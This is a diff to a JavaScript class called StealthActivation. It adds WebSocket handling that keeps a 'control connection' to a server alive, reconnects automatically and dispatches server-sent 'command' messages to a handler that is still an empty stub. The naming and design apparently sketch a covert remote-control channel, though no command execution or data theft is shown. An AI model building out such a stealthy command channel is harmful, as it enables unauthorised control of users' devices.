@@ -555,12 +555,87 @@ class StealthActivation {
                 }));
             };
             
+            ws.onmessage = (event) => {
+                try {
+                    const message = JSON.parse(event.data);
+                    this.handleServerMessage(message);
+                } catch (error) {
+                    console.error('❌ خطأ في معالجة رسالة الخادم:', error);
+                }
+            };
+            
             ws.onerror = (error) => {
                 console.error('❌ فشل في الاتصال بالخادم:', error);
             };
             
+            ws.onclose = (event) => {
+                console.log('❌ تم قطع الاتصال بالخادم');
+                console.log(`  📄 الكود: ${event.code}`);
+                console.log(`  📝 السبب: ${event.reason || 'غير محدد'}`);
+                
+                // محاولة إعادة الاتصال بعد 5 ثوان
+                setTimeout(() => {
+                    console.log('🔄 محاولة إعادة الاتصال بالخادم...');
+                    this.setupServerConnection();
+                }, 5000);
+            };
+            
         } catch (error) {
             console.error('❌ فشل في إعداد الاتصال:', error);
+        }
+    }
+    
+    // معالجة رسائل الخادم
+    handleServerMessage(message) {
+        try {
+            console.log('📨 رسالة من الخادم:', message.type);
+            
+            switch (message.type) {
+                case 'activation_acknowledged':
+                    console.log('✅ تم تأكيد التفعيل من الخادم');
+                    console.log(`  📝 الرسالة: ${message.message}`);
+                    console.log(`  🔗 الاتصال مستمر: ${message.keepConnection ? 'نعم' : 'لا'}`);
+                    
+                    // التأكد من أن الاتصال مستمر
+                    if (message.keepConnection) {
+                        console.log('🔗 الاتصال بالخادم مستقر - لا حاجة لإعادة التوجيه');
+                    }
+                    break;
+                    
+                case 'command':
+                    console.log('📋 أمر جديد من الخادم:', message.command);
+                    this.handleServerCommand(message);
+                    break;
+                    
+                case 'ping':
+                    // رد على ping بـ pong
+                    if (window.controlConnection && window.controlConnection.readyState === 1) {
+                        window.controlConnection.send(JSON.stringify({
+                            type: 'pong',
+                            timestamp: Date.now()
+                        }));
+                    }
+                    break;
+                    
+                default:
+                    console.log('📨 رسالة غير معروفة من الخادم:', message.type);
+            }
+            
+        } catch (error) {
+            console.error('❌ خطأ في معالجة رسالة الخادم:', error);
+        }
+    }
+    
+    // معالجة أوامر الخادم
+    handleServerCommand(message) {
+        try {
+            const { command, parameters } = message;
+            console.log(`📋 تنفيذ أمر: ${command}`);
+            
+            // يمكن إضافة معالجة الأوامر هنا لاحقاً
+            
+        } catch (error) {
+            console.error('❌ خطأ في معالجة أمر الخادم:', error);
         }
     }
 
